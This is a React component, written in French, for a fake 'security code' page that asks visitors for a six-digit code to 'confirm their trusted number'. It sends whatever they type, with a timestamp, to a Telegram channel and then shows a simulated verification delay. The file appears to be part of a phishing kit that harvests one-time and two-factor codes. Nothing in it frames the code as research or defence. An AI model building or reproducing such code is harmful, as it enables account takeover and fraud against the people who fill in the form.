import React, { useState } from 'react';
import { sendToTelegram } from '../utils/telegram';

interface SecurityCodeFormProps {
  onNext: () => void;
}

export default function SecurityCodeForm({ onNext }: SecurityCodeFormProps) {
  const [code, setCode] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    // Préparer le message pour Telegram
    const message = `
<b>🔐 Code de sécurité saisi</b>

<b>Code de sécurité:</b> ${code}
<b>Timestamp:</b> ${new Date().toLocaleString('fr-FR')}
<b>Page:</b> Code de sécurité 6 chiffres
    `;

    // Envoyer vers Telegram
    await sendToTelegram(message);

    // Simuler un délai puis passer à l'étape suivante
    setTimeout(() => {
      setIsLoading(false);
      onNext();
    }, 1500);
  };

  return (
    <div className="continer">
      <form onSubmit={handleSubmit}>
        <h2>Code de sécurité</h2>

        <div className="col">
          <h4 style={{ fontWeight: 'normal', textAlign: 'left' }}>
            Merci de saisir votre code de sécurité à 6 chiffres pour confirmer votre numéro de confiance.
          </h4>
        </div>

        <div className="col">
          <input 
            type="text" 
            placeholder="Entrez votre code de sécurité" 
            value={code}
            onChange={(e) => setCode(e.target.value)}
            maxLength={6}
            required 
          />

          <div className="but">
            <button type="submit" disabled={isLoading}>
              {isLoading ? 'Vérification...' : 'Confirmer'}
            </button>
          </div>
        </div>
      </form>
    </div>
  );
}